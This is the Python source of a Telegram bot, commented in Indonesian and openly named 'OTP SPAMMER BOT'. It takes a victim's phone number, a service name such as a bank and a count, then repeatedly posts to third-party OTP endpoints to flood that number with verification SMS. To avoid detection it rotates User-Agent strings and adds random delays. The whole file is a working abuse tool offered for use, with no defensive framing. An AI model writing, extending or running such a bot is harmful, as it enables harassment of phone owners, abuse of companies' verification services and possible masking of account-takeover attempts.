# main.py
import requests
import time
import telebot
import threading
import random
from config import BOT_TOKEN, SERVICES

bot = telebot.TeleBot(BOT_TOKEN)

def send_spam(service, phone, count=5):
    """Kirim OTP sebanyak count ke nomor phone via layanan service"""
    url = SERVICES.get(service)
    if not url:
        return f"❌ Layanan '{service}' tidak ditemukan. Gunakan /services untuk daftar."
    
    success = 0
    for i in range(count):
        try:
            # Payload standar (sesuaikan jika perlu)
            payload = {"phone": phone, "number": phone, "msisdn": phone}
            headers = {
                "User-Agent": random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
                    "Mozilla/5.0 (Linux; Android 11; SM-G991B)"
                ]),
                "Accept": "application/json",
                "Content-Type": "application/json"
            }
            # Coba beberapa payload umum
            for payload_key in ["phone", "number", "msisdn"]:
                try:
                    p = {payload_key: phone}
                    r = requests.post(url, json=p, headers=headers, timeout=5)
                    if r.status_code in [200, 201, 202, 204]:
                        success += 1
                        break
                except:
                    continue
            time.sleep(random.uniform(0.3, 1.0))
        except Exception as e:
            pass
    return f"✅ Berhasil mengirim {success} dari {count} OTP ke {phone} via {service.upper()}"

@bot.message_handler(commands=['start', 'help'])
def help_cmd(msg):
    text = """
🤖 *OTP SPAMMER BOT*
KIRIM PERINTAH:
/spam <nomor> <layanan> <jumlah>
Contoh: `/spam 08123456789 bca 10`

/services – lihat daftar layanan tersedia
/help – bantuan ini

*Catatan:* Nomor tanpa awalan 0, pakai kode negara 62.
"""
    bot.reply_to(msg, text, parse_mode='Markdown')

@bot.message_handler(commands=['services'])
def list_services(msg):
    text = "📋 *Layanan tersedia:*\n" + "\n".join([f"- {k}" for k in SERVICES.keys()])
    bot.reply_to(msg, text, parse_mode='Markdown')

@bot.message_handler(commands=['spam'])
def cmd_spam(msg):
    parts = msg.text.split()
    if len(parts) < 3:
        bot.reply_to(msg, "❌ Format: /spam <nomor> <layanan> <jumlah>\nContoh: /spam 08123456789 bca 10")
        return
    phone = parts[1]
    service = parts[2].lower()
    count = int(parts[3]) if len(parts) > 3 else 5
    if count > 50:
        bot.reply_to(msg, "⚠️ Maksimal 50 permintaan sekali kirim.")
        return
    if service not in SERVICES:
        bot.reply_to(msg, f"❌ Layanan '{service}' tidak ada. Ketik /services untuk daftar.")
        return
    bot.reply_to(msg, f"⏳ Memproses {count} OTP ke {phone} via {service.upper()}...")
    threading.Thread(target=lambda: bot.send_message(msg.chat.id, send_spam(service, phone, count))).start()

if __name__ == "__main__":
    print("🔥 Bot OTP Spammer berjalan...")
    bot.infinity_polling()